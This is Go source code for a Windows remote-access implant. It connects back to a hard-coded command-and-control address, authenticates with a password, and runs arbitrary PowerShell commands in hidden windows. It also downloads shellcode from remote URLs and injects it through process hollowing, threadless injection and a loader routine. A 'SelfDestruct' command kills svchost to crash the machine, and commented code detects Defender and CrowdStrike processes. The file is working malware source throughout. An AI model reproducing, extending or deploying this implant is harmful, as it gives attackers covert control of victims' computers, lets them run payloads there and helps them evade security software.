package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"syscall"
	"time"

	"github.com/D3Ext/maldev/process"
	"github.com/D3Ext/maldev/shellcode"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	buffer := make([]byte, 100)
	read_len, err := addr.Read(buffer)
	if read_len <= 1 {
		fmt.Println("Error with size of buffer")
		return addr, false
	}
	if err != nil {
		fmt.Println("A general network error has occured")
		return addr, false
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "AreYouAlive\n" {
		os.Exit(1)
	}
	reply2Auth(&addr)
	*attempts = 0
	return addr, true
}

func reply2Auth(conn *net.Conn) {
	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
}

func listen4Commands(conn *net.Conn) string {
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn *net.Conn, command *string) {
	if *command == "stop\n" {
		terminate()
	}
	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	ps_instance := exec.Command(powershellPath, "/c", *command)
	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
	output, err := ps_instance.Output()
	if err != nil {
		output = []byte("Couldn't execute the command\n")
		fmt.Println("Couldnt Execute the command")
	}
	(*conn).Write(output)
}

// Have the server send a list of processes to check instead of hard coding them in the client
// func checkSec() []string {
// 	products := []string{}
// 	procs, err := process.GetProcesses()
// 	if err != nil {
// 		fmt.Println("Couldn't Get Processes")
// 	}
// 	for index := range procs {
// 		if procs[index].Exe == "MsMpEng.exe" {
// 			products = append(products, "Defender")
// 		}
// 		if procs[index].Exe == "CSFalconService.exe" {
// 			products = append(products, "CrowdStrike")
// 		}
// 	}
// 	return products
// }

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

// Test this once home //Once it works I think it would be smart to store the data of this server side in session struct to leave less artifacts 3al network.
func cd(conn *net.Conn, pImplantWD *string) {
	(*conn).Write([]byte("OK\n"))
	buff := make([]byte, 100)
	read_len, err := (*conn).Read(buff)
	if err != nil {
		fmt.Println("Something went wrong")
		return
	}
	if read_len <= 1 {
		fmt.Println("Something went wrong")
		return
	}
	buffSnapped := buff[:read_len]
	dir2Go := string(buffSnapped)
	err = os.Chdir(dir2Go)
	if err != nil {
		fmt.Println("The dir does not exist or you don't have sufficient privs")
		(*conn).Write([]byte("RETURN\n"))
		return
	}
	*pImplantWD, err = os.Getwd()
	if err != nil {
		fmt.Println("Error Getting the current wd. FATAL")
		(*conn).Write([]byte("RETURN\n"))
		return
	}
	(*conn).Write([]byte("OK\n"))
}

func ls(conn *net.Conn, implantWD *string) {
	dirFS, _ := os.ReadDir(*implantWD)
	dirListing := ""
	for e := range dirFS {
		dirInfo, _ := dirFS[e].Info()
		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "	" + dirInfo.Name() + "\n"
	}
	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
		"		----		" + "----		" + "	----" + "\n" +
		dirListing + "\n")) //Looks funky but I want it organized. Write this server side later.
}

func main() {
	c2Address := "192.168.0.106:9003"
	attempts := 0
	implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for { //Main Program Loop
		command := listen4Commands(&conn)
		fmt.Println(command)
		switch command {
		case "AreYouAlive\n":
			reply2Auth(&conn)
		case "SelfDestruct\n": //This only works if it has admin privs. It is the BSOD.
			{
				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				output, err := ps_instance.Output()
				if err != nil {
					fmt.Println("Couldnt Execute the command")
				}
				fmt.Println(output)
				conn.Write([]byte("NoTime2Die\n"))
			}
		case "cd\n":
			{
				cd(&conn, &implantWD)
			}
		case "ls\n":
			{
				ls(&conn, &implantWD)
			}
		case "pwd\n":
			{
				fmt.Println(implantWD)
				conn.Write([]byte(implantWD))
			}
		case "barCode\n":
			{
				buffer := make([]byte, 100)
				conn.Write([]byte("OK\n"))
				read_len, err := conn.Read(buffer)
				if err != nil {
					fmt.Println("Problem Reading the buffer")
					conn.Write([]byte("Return"))
					continue
				}
				if read_len <= 1 {
					fmt.Println("Problem with Buffer Size")
					conn.Write([]byte("Return"))
					continue
				}
				bufferSnapped := buffer[:read_len]
				remoteFileURL := string(bufferSnapped)
				fmt.Println(remoteFileURL)
				if remoteFileURL == "" {
					fmt.Println("URL not recieved !")
					conn.Write([]byte("Return"))
				}
				conn.Write([]byte("OK\n"))
				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
				if err != nil {
					fmt.Println("Couldn't get shellcode")
					continue
				}
				barCodeLoad(&conn, &sc)
			}
		case "hollow\n":
			{
				conn.Write([]byte("OK\n"))
				//Check if the file even exists
				buffer := make([]byte, 100) //It was 6MB buffer no need for smth so large
				read_len, err := conn.Read(buffer)
				if err != nil {
					fmt.Println("Problem Reading the buffer")
					conn.Write([]byte("Return"))
					continue
				}
				if read_len <= 1 {
					fmt.Println("Problem with Buffer Size")
					conn.Write([]byte("Return"))
					continue
				}
				filePath := string(buffer[:read_len])
				fmt.Println(filePath)
				// filePath = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
				_, err = os.Stat(filePath)
				if err != nil {
					fmt.Println("The binary does not exist !!! Path: " + filePath)
					fmt.Println()
					conn.Write([]byte("File does not exist"))
					continue
				}
				conn.Write([]byte("OK\n"))
				fmt.Println("The file exists and is readable: " + filePath)

				// Get the download URL of the remote file
				read_len, err = conn.Read(buffer)
				if err != nil {
					fmt.Println("Problem Reading the buffer")
					conn.Write([]byte("Return"))
					continue
				}
				if read_len <= 1 {
					fmt.Println("Problem with Buffer Size")
					conn.Write([]byte("Return"))
					continue
				}
				bufferSnapped := buffer[:read_len]
				remoteFileURL := string(bufferSnapped)
				fmt.Println(remoteFileURL)
				if remoteFileURL == "" {
					fmt.Println("URL not recieved !")
					conn.Write([]byte("RETURN"))
				}
				conn.Write([]byte("OK\n"))
				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
				if err != nil {
					fmt.Println("Couldn't get shellcode")
					continue
				}
				//Hardcore method below
				// //Create a buffer to recieve the shellcode and fire it
				// read_len, err = conn.Read(buffer)
				// if err != nil {
				// 	fmt.Println("Problem Reading the buffer")
				// 	conn.Write([]byte("Return"))
				// 	return
				// }
				// if read_len <= 1 {
				// 	fmt.Println("Problem with Buffer Size")
				// 	conn.Write([]byte("Return"))
				// 	return
				// }
				// sc := buffer[:read_len]
				// conn.Write([]byte("OK\n"))
				// fmt.Println("Shellcode Recieved Commencing Hollowing")
				hollow(&conn, sc, filePath)
			}
		case "threadless\n":
			{
				conn.Write([]byte("OK\n"))
				buffer := make([]byte, 100)
				read_len, err := conn.Read(buffer)
				if read_len <= 1 {
					fmt.Println("Error with size of buffer")
					conn.Write([]byte("RETURN"))
					continue
				}
				if err != nil {
					fmt.Println("Error with buffer")
					conn.Write([]byte("RETURN"))
					continue
				}
				bufferSnapped := buffer[:read_len]
				strBuffer := string(bufferSnapped)
				fmt.Println(strBuffer)

				pid, err := process.FindPidByName(strBuffer)
				if err != nil {
					fmt.Println("Couldn't find the process")
					conn.Write([]byte("RETURN"))
					continue
				}
				if len(pid) <= 0 {
					fmt.Println("Couldn't find the process")
					conn.Write([]byte("RETURN"))
					continue
				}
				fmt.Println(pid)
				targetPID := pid[0]
				fmt.Println("Found target process")
				conn.Write([]byte("OK\n"))

				// Get the download URL of the remote file
				read_len, err = conn.Read(buffer)
				if err != nil {
					fmt.Println("Problem Reading the buffer")
					conn.Write([]byte("Return"))
					continue
				}
				if read_len <= 1 {
					fmt.Println("Problem with Buffer Size")
					conn.Write([]byte("Return"))
					continue
				}
				bufferSnapped = buffer[:read_len]
				remoteFileURL := string(bufferSnapped)
				fmt.Println(remoteFileURL)
				if remoteFileURL == "" {
					fmt.Println("URL not recieved !")
					conn.Write([]byte("Return"))
					continue
				}
				conn.Write([]byte("OK\n"))
				sc, err := shellcode.GetShellcodeFromUrl(remoteFileURL)
				if err != nil {
					fmt.Println("Couldn't get shellcode")
					continue
				}
				//Research a bit more about the functions and dll we can hit
				function := "NtOpenFile"
				dll := "ntdll.dll"
				threadless(&conn, targetPID, function, dll, &sc)
			}
		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
			executeCommands(&conn, &command)
		}
	}
}
